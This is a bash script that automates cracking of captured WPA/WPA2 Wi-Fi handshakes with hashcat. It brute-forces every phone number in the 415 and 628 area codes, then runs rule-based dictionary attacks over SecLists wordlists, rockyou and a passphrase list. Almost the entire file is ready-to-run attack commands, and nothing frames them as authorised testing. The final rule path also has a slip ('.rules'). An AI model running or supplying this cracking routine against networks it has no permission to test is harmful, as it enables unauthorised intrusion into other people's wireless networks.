#!/bin/bash
echo
echo "############################################################"
echo "##                  Phone Number Attack                   ##"
echo "############################################################"
echo
echo "💀 |   Trying all 415 numbers"
hashcat -m 22000 $1 -w 3  --quiet --quiet -a3 -1 "?d" "415?1?1?1?1?1?1?1"
echo "💀 |   Trying all 628 numbers"
hashcat -m 22000 $1 -w 3  --quiet --quiet -a3 -1 "?d" "628?1?1?1?1?1?1?1"
if [ -f "$HOME/src/SecLists/LICENSE" ]; then
    echo "danielmiessler/SecLists files found."
else
    exit
fi
echo
echo "############################################################"
echo "##             Trying WPA Top 4800 Passwords              ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet --quiet -r ./rules/best64.rule $HOME/src/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
echo
echo "############################################################"
echo "##           Trying 10K Most Common Passwords             ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet -r ./rules/best64.rule $HOME/src/SecLists/Passwords/Common-Credentials/10k-most-common.txt
echo
echo "############################################################"
echo "##        Trying 100K Most Common NCSC Passwords          ##" 
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet -r ./rules/best64.rule $HOME/src/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
echo
echo "############################################################"
echo "##              Trying 2017 Darweb Top 10K                ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet -r ./rules/best64.rule $HOME/src/SecLists/Passwords/darkweb2017-top10000.txt
echo
echo "############################################################"
echo "##              Trying the Rockyou Wordlist               ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet -r ./rules/best64.rule rockyou.txt
echo
echo "############################################################"
echo "##     Trying the Common Credentials Top 10 million       ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet -r ./rules/best64.rule $HOME/src/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
echo
echo "############################################################"
echo "##          Trying the Xatonet Top 10 million             ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -w 3  --quiet -r ./rules/best64.rule $HOME/src/SecLists/Passwords/xato-net-10-million-passwords.txt
echo
echo "############################################################"
echo "##             Executing Passphrase Attack                ##"
echo "############################################################"
echo
hashcat -m 22000 $1 -r .rules/best64.rule -w 3  --quiet ./passphrase\ attack/passphrases.txt
